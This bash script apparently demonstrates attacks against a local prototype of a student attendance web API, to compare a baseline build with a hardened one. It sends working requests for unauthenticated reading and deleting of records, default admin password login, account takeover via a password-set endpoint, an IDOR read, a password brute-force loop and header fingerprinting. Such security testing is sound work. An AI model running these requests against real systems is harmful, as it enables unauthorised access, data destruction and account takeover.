#!/usr/bin/env bash
# Local, authorised attack demo against OUR OWN prototype (see report: Ethical Guidelines).
# Usage: ./attack_demo.sh http://localhost:5000   (run against the baseline, then the hardened build)
BASE="${1:-http://localhost:5000}"
J='-H Content-Type:application/json'
show() { printf '%-62s -> HTTP %s  %s\n' "$1" "$2" "$(echo "$3" | head -c 110 | tr '\n' ' ')"; }
call() { # label method path [body]
  local out code body
  out=$(curl -s -m 10 -o /tmp/ad_body -w '%{http_code}' -X "$2" $J ${4:+-d "$4"} "$BASE$3"); code="$out"; body=$(cat /tmp/ad_body)
  show "$1" "$code" "$body"
}
echo "=== Target: $BASE ==="
call "T1  Read all students with no login"                     GET    /api/students
call "T2  Admin login with default password admin123"           POST   /api/admin-login '{"email":"admin@cihe.edu.au","password":"admin123"}'
call "T3  Create a student with no login"                       POST   /api/students '{"name":"Mallory","email":"mallory@evil.test"}'
call "T4  Claim that account knowing only the email"            POST   /api/set-password '{"email":"mallory@evil.test","password":"pwned12345678"}'
call "T5  Read another student's attendance (IDOR)"             GET    /api/attendance/student/student@cihe.edu.au
call "T6  Delete a student with no login"                       DELETE /api/students/1
call "T7  Delete a unit with no login"                          DELETE /api/units/ICT307
printf '%-62s -> ' "T8  20 wrong passwords in a row (any 429 = lockout?)"
codes=""; for i in $(seq 1 20); do codes="$codes $(curl -s -m 10 -o /dev/null -w '%{http_code}' -X POST $J -d '{"email":"student@cihe.edu.au","password":"guess'$i'"}' "$BASE/api/login")"; done
echo "$codes" | tr ' ' '\n' | sort | uniq -c | tr '\n' ' '; echo
printf '%-62s -> ' "T9  Response headers (server fingerprint / CSP)"
curl -sI -m 10 "$BASE/api/units" | grep -i -E '^(x-powered-by|content-security-policy|x-content-type-options)' | tr -d '\r' | tr '\n' ' '; echo
